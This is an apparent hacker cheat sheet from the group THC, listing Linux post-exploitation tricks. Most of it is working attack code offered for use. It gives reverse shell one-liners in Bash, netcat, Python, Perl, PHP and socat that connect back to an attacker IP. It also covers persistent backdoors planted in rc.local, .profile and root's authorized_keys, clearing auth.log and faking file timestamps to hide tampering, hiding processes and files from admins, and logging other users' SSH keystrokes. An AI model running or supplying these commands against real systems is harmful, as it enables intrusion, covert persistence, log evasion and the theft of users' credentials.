# THC's favourite Tips, Tricks & Hacks (Cheat Sheet)

## Available at [https://tiny.cc/thctricks](https://tiny.cc/thctricks)

A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.

We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.

Got tricks? Send them to root@thc.org or submit a pull request.

1. [Bash](#lbwh-anchor)
   1. [Leave Bash without history](#lbwh-anchor)
   1. [Hide your command](#hyc-anchor)
   1. [Hide your arguments](#hya-anchor)
2. [SSH](#ais-anchor)
   1. [Almost invisible SSH](#ais-anchor)
   1. [SSH tunnel OUT](#sto-anchor)
   1. [SSH tunnel IN](#sti-anchor)
   1. [SSH socks5 OUT](#sso-anchor)
   1. [SSH socks5 IN](#ssi-anchor)
3. [Network](#network-anchor)
   1. [ARP discover computers on the local network](#adln-anchor)
   1. [ICMP discover local network](#idln-anchor)
   1. [Monitor all new TCP connections](#mtc-anchor)
   1. [Alert on all new TCP connections](#atc-anchor)
4. [File Encoding and Transfer](#fe-anchor)
   1. [uuencode](#feu-anchor)
   1. [openssl](#feo-anchor)
   1. [xxd](#fex-anchor)
   1. [Multiple binaries](#feb-anchor)
   1. [File transfer using screen from REMOTE to LOCAL](#ftsrl-anchor)
   1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
   1. [File transfer using gs-netcat and sftp](#ftgs-anchor)
5. [Reverse Shell / Dumb Shell](#rs-anchor)
   1. [Reverse Shells](#rs-anchor)
      1. [with gs-netcat](#rswg-anchor)
      1. [with Bash](#rswb-anchor)
      1. [without Bash](#rswob-anchor)
      1. [with Python](#rswpy-anchor)
      1. [with Perl](#rswpl-anchor)
      1. [with PHP](#rswphp-anchor)
   1. [Upgrading the dumb shell](#rsu-anchor)
      1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
      1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
      1. [Reverse shell with socat (fully interactive)](#rssc-anchor)
 6. [Backdoors](#bd-anchor)
    1. [Background reverse shell](#bdrs-anchor)
    1. [authorized_keys](#bdak-anchor)
    1. [Remote access an entire network](#bdra-anchor)
 7. [Shell Hacks](#sh-anchor)
    1. [Shred files (secure delete)](#shsf-anchor)
    1. [Shred files without *shred*](#shsfwo-anchor)
    1. [Restore the date of a file](#shrdf-anchor)
    1. [Clean logfile](#shcl-anchor)
    1. [Hide files from a User without root privileges](#shhu-anchor)
 8. [Crypto](#cr-anchor)
    1. [Generate quick random Password](#crgrp-anchor)
    1. [Linux transportable encrypted filesystems](#crltefs-anchor)
    1. [Encrypting a file](#cref-anchor)
 9. [Miscellaneous](#misc-anchor)
    1. [Sniff a user's SSH session](#sss-anchor)
    1. [Sniff a user's SSH session without strace](#ssswos-anchor)
    1. [Sniff a user's SSH session without root privileges](#ssswor-anchor)
    1. [How to survive high latency connections](#hlc-anchor)
    
   

---
<a id="lbwh-anchor"></a>
**1.i. Leave Bash without history:**

Tell Bash to use */dev/null* instead of *~/.bash_history*. This is the first command we execute on every shell. It will stop the Bash from logging your commands. 

```
$ export HISTFILE=/dev/null
```

It is good housekeeping to 'commit suicide' when exiting a shell:
```
$ alias exit='kill -9 $$'
```

Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
```
$  id
```
<a id="hyc-anchor"></a>
**1.ii. Hide your command**

```
$ /bin/bash -c "exec -a syslogd nmap -T0 10.0.2.1/24"
or starting as a background process:
$ exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &
```

Alternatively if there is no Bash:
```
$ cp `which nmap` syslogd
$ PATH=.:$PATH syslogd -T0 10.0.2.1/24
```
In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.

<a id="hya-anchor"></a>
**1.iii. Hide your arguments**

Download [zap-args.c](src/zap-args.c). This example will execute *nmap* but will make it appear as 'syslogd' without any arguments in the *ps alxww* output.

```
$ gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl
$ LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24
```
Note: There is a gdb variant as well. Anyone?

---
<a id="ais-anchor"></a>
**2.i. Almost invisible SSH**
```
$ ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
```
This will not add your user to the */var/log/utmp* file and you won't show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.

<a id="sto-anchor"></a>
**2.ii SSH tunnel OUT**

We use this all the time to circumvent local firewalls and IP filtering:
```
$ ssh -g -L31337:1.2.3.4:80 user@server.org
```
You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'server.org'. An alternative and without the need for a server is to use [gs-netcat](#bdra-anchor).

<a id="sti-anchor"></a>
**2.iii SSH tunnel IN**

We use this to give access to a friend to an internal machine that is not on the public Internet:
```
$ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
```
Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#bdra-anchor).

<a id="sso-anchor"></a>
**2.iv SSH socks4/5 OUT**

OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.

```
$ ssh -D 1080 user@server.org
```
Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through *server.org* and will appear with the source IP of *server.org*. An alternative and without the need for a server is to use [gs-netcat](#bdra-anchor).

<a id="ssi-anchor"></a>
**2.v SSH socks4/5 IN**

This is the reverse of the above example. It give others access to your *local* network or let others use your computer as a tunnel end-point.

```
$ ssh -g -R 1080 user@server.org
```

The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#bdra-anchor).

---
<a id="network-anchor"></a>
<a id="adln-anchor"></a>
**3.i. ARP discover computers on the local network**
```
$ nmap -r -sn -PR 192.168.0.1/24
```
This will Arp-ping all local machines just like *arping*. ARP ping always seems to work and is very steahlthy (e.g. does not show up in the target's firewall). However, this command is by far our favourite:
```
$ nmap -thc
```

**3.ii. ICMP discover local network**

...and when we do not have nmap and we can not do broadcast pings (requires root) then we use this:
```
$ for x in `seq 1 254`; do ping -on -c 3 -i 0.1 -W 200 192.168.1.$x | grep 'bytes from' | cut -f4 -d" " | sort -u; done
```

<a id="mtc-anchor"></a>
**3.iii. Monitor all new TCP connections**

```
# tcpdump -n "tcp[tcpflags] == tcp-syn"
```

<a id="atc-anchor"></a>
**3.iv. Alert on new TCP connections**

Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from the target system (could be an admin!).

```
# tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
```

---
<a id="fe-anchor"></a>
<a id="feu-anchor"></a>
**4.i. File Encoding - uuencode**

Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).

Encode:
```
$ uuencode /etc/issue.net issue.net-COPY
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```
Cut & paste the output (4 lines, starting with 'being 644 ...') into this command:
Decode:
```
$ uudecode
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```

<a id="feo-anchor"></a>
**4.ii. File Encoding - openssl**

Openssl can be used when uu/decode/encode is not available on the remote system:

Encode:
```
$ openssl base64 </etc/issue.net
VWJ1bnR1IDE4LjA0LjIgTFRTCg==
```
Cut & paste the output into this command:
```
$ openssl base64 -d >issue.net-COPY
```

<a id="fex-anchor"></a>
**4.iii. File Encoding - xxd**

..and if neither *uuencode* nor *openssl* is available then we have to dig a bit deeper in our trick box and use *xxd*.

Encode:
```
$ xxd -p </etc/issue.net
726f6f743a783a303a30...
```

Cut & paste the output into this command:
Decode:
```
$ xxd -p -r >issue.net-COPY
```
<a id="feb-anchor"></a>
**4.iv. File Encoding - Multiple Binaries**

Method 1: Using *shar* to create a self extracting shell script with binaries inside:
```
$ shar *.png *.c >stuff.shar
```
Transfer *stuff.shar* to the remote system and execute it:
```
$ chmod 700 stuff.shar
$ ./stuff.shar
```

Method 2: Using *tar*
```
$ tar cfz - *.png *.c | openssl base64 >stuff.tgz.b64
```
Transfer *stuff.tgz.b64* to the remote system and execute:
```
$ openssl base64 -d <stuff.tgz.b64 | tar xfz -
```

<a id="ftsrl-anchor"></a>
**4.v. File transfer - using *screen* from REMOTE to LOCAL**

Transfer a file FROM the remote system to your local system:

Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:

> CTRL-a : logfile screen-xfer.txt

> CTRL-a H

We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:

```
$ openssl base64 </etc/issue.net
```

Stop your local screen from logging any further data:

> CTRL-a H 

On your local computer and from a different shell decode the file:
```
$ openssl base64 -d <screen-xfer.txt
$ rm -rf screen-xfer.txt
```

<a id="ftslr-anchor"></a>
**4.vi. File transfer - using *screen* from LOCAL to REMOTE**

On your local system (from within a different shell) encode the data:
```
$ openssl base64 </etc/issue.net >screen-xfer.txt
```

On the remote system (and from within the current *screen*):
```
$ openssl base64 -d
```

Get *screen* to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:

> CTRL-a : readbuf screen-xfer.txt

> CTRL-a : paste .

> CTRL-d

> CTRL-d

Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).

<a id="ftgs-anchor"></a>
**4.vii. File transfer - using gs-netcat and sftp**

Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. It uses the Global Socket Relay Network and no central server or IP address is required to connect to the SFTP/Gsocket server (just a password hash).
```
$ gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host
```

From your workstation execute this command to connect to the SFTP server:
```
$ export GSOCKET_ARGS="-s MySecret"                        # Workstation
$ sftp -D gs-netcat                                        # Workstation
```

---
<a id="rs-anchor"></a>
<a id="rswg-anchor"></a>
**5.i.a. Reverse shell with gs-netcat**

Use [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>

```
$ gs-netcat -s MySecret -l -i    # Host
```
Use -D to start the reverse shell in the background (daemon) and with a watchdog to auto-restart if killed.

To connect to the shell from your workstation:
```
$ gs-netcat -s MySecret -i
```
Use -T to tunnel trough TOR.

<a id="rswb-anchor"></a>
**5.i.b. Reverse shell with Bash**

Start netcat to listen on port 1524 on your system:
```
$ nc -nvlp 1524
```

On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
```
$ setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &
```

<a id="rswob-anchor"></a>
**5.i.c. Reverse shell without Bash**

Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:

On the remote system:

```
$ nc -e /bin/bash -vn 3.13.3.7 1524
```

Variant if *'-e'* is not supported:
```
$ mkfifo /tmp/.io
$ sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
```

Telnet variant:
```
$ mkfifo /tmp/.io
$ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
```

Telnet variant when mkfifo is not supported (Ulg!):
```
$ (touch /dev/shm/.fio; sleep 60; rm -f /dev/shm/.fio) &
$ tail -f /dev/shm/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/dev/shm/.fio
```
Note: Use */tmp/.fio* if */dev/shm* is not available.
Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.

<a id="rswpy-anchor"></a>
**5.i.d. Reverse shell with Python**
```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<a id="rswpl-anchor"></a>
**5.i.e. Reverse shell with Perl**

```
# method 1
$ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# method 2
$ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```
<a id="rswphp-anchor"></a>
**5.i.e. Reverse shell with PHP**

```
php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
```

<a id="rsu-anchor"></a>
<a id="rsup-anchor"></a>
**5.ii.a. Upgrade a reverse shell to a PTY shell**

Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrade the shell to a real PTY shell:

```
$ exec script -qc /bin/bash /dev/null  # Linux
$ exec script -q /dev/null /bin/bash   # BSD
```

Or:
```
# Python
$ exec python -c 'import pty; pty.spawn("/bin/bash")'
```

<a id="rsup2-anchor"></a>
**5.ii.b. Upgrade a reverse shell to a fully interactive shell**

...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:

```
# On the target host spwan a PTY using any of the above examples:
$ python -c 'import pty; pty.spawn("/bin/bash")'

# Now Press Ctrl-Z to suspend the connection and return to your own terminal.
# On your terminal execute:
$ stty raw -echo; fg

# On target host
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 24 columns 80
```

<a id="rssc-anchor"></a>
**5.ii.c. Reverse shell with socat (fully interactive)**

...or install socat and get it done without much fiddling about:

```
# on attacker's host (listener)
socat file:`tty`,raw,echo=0 tcp-listen:1524
# on target host (reverse shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
```

---
<a id="bd-anchor"></a>
<a id="bdrs-anchor"></a>
**6.i. Background reverse shell**

A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 

```
$ while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done &>/dev/null &
```

or add to */etc/rc.local*:
```
nohup bash -c 'while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done' &>/dev/null &
```

or the user's *~/.profile* (also stops multiple instances from being started):
```
fuser /dev/shm/.busy &>/dev/null
if [ $? -eq 1 ]; then
        nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 3600; done' &>/dev/null &
fi
```


<a id="bdak-anchor"></a>
**6.ii. authorized_keys**

Add your ssh public key to */root/.ssh/authorized_keys*. It's the most reliable backdoor ever :>

* It survives reboots.
* It even survives re-installs. Admins have been known to make a backup of authorized_keys and then put it straight back onto the newly installed system.
* We have even seen our key being copied to other companies!

Tip: Change the name at the end of the ssh public keyfile to something obscure like *backup@ubuntu* or the admin's real name:
```
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
[...]
u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
```
<a id="bdra-anchor"></a>
**6.iii. Remote Access to an entire network**

Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS relay on the Host's private lan which is accessible through the Global Relay network without the need to run your own server (e.g. directly from your workstation):

```
$ gs-netcat -l -S       # compromised Host
```

Now from your workstation you can connect to ANY host on the Host's private LAN:
```
$ gs-netcat -p 1080    # Your workstation.

Access route.local:22 on the Host's private LAN from your Workstation:
$ socat -  "SOCKS4a:127.1:route.local:22"
```

Use -T to use TOR.

---
<a id="sh-anchor"></a>
<a id="shsf-anchor"></a>
**7.i. Shred & Erase a file**

```
$ shred -z foobar.txt
```

<a id="shsfwo-anchor"></a>
**7.ii. Shred & Erase without *shred***
```
$ FN=foobar.txt; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
```
Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.

Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.

<a id="shrdf-anchor"></a>
**7.iii. Restore the date of a file**

Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)

```
$ touch -r /etc/shadow /etc/passwd
```

<a id="shcl-anchor"></a>
**7.iv. Clear logfile**

This will reset the logfile to 0 without having to restart syslogd etc:
```
# cat /dev/null >/var/log/auth.log
```

This will remove any sign of us from the log file:
```
# cd /dev/shm
# grep -v 'thc\.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
```

<a id="shhu-anchor"></a>
**7.v. Hide files from that User without root privileges**

Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.

Hiding permanent files:

Method 1:
```
$ alias ls='ls -I system-dev'
```

This will hide the directory *system-dev* from the *ls* command. Place in User's *~/.profile* or system wide */etc/profile*.

Method 2:
Tricks from the 80s. Consider any directory that the admin rarely looks into (like */boot/.X11/..* or so):
```
$ mkdir '...'
$ cd '...'
```

Method 3:
Unix allows filenames with about any ASCII character but 0x00. Try tab (*\t*). Happens that most Admins do not know how to cd into any such directory.
```
$ mkdir $'\t'
$ cd $'\t'
```

<a id="cr-anchor"></a>
<a id="crgrp-anchor"></a>
**8.i. Generate quick random Password**

Good for quick passwords without human element.

```
$ openssl rand -base64 24
```

If `openssl` is not available then we can also use `head` to read from `/dev/urandom`.

```
$ head -c 32 < /dev/urandom | xxd -p -c 32
```

<a id="crltefs-anchor"></a>
**8.ii. Linux transportable encrypted filesystems**

Create a 256MB large encrypted file system. You will be prompted for a password.

```
$ dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
$ cryptsetup luksFormat /tmp/crypted
$ mkfs.ext3 /tmp/crypted
```

Mount:

```
# losetup -f
# losetup /dev/loop0 /tmp/crypted
# cryptsetup open /dev/loop0 crypted
# mount -t ext3 /dev/mapper/crypted /mnt/crypted
```

Store data in `/mnt/crypted`, then unmount:

```
# umount /mnt/crypted
# cryptsetup close crypted
# losetup -d /dev/loop0
```

<a id="misc-anchor"></a>
**8.iii Encrypting a file**

Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):

Encrypt:
```
$ openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt >input.txt.enc
```

Decrypt:
```
$ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.txt
```

---
<a id="misc-anchor"></a>
<a id="sss-anchor"></a>
**9.i. Sniff a user's SSH session**
```
$ strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
```
Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.

<a id="ssswos-anchor"></a>
**9.ii Sniff a user's SSH session without strace**

The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
```
$ echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
```
Consider using [zap-args](#hya-anchor) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.

<a id="ssswor-anchor"></a>
**9.iii. Sniff a user's SSH session without root privileges**

Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)

Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
```
# Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile

# Create a log directory and our own ssh binary
$ mkdir -p ~/.local/bin ~/.ssh/logs

$ cat >~/.local/bin/ssh
#! /bin/bash
strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
# now press CTRL-d to close the file.

$ cat ~/.local/bin/ssh-log
#! /bin/bash
grep 'read(4' | cut -f2 -d\" | while read -r x; do
        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi
        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
                echo ""
        else
                echo -n "${x}"
        fi
done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
# now press CTRL-d to close the file

$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
```

The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.

<a id="hlc-anchor"></a>
**9.iii. How to survive high latency connections**

Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...

Example for the receiving end of a revese tunnel:
```
$ rlwrap nc -vnlp 1524
```

Example for *SSH*:
```
$ rlwrap ssh user@host
```

---
Shoutz: ADM, Oscar2020
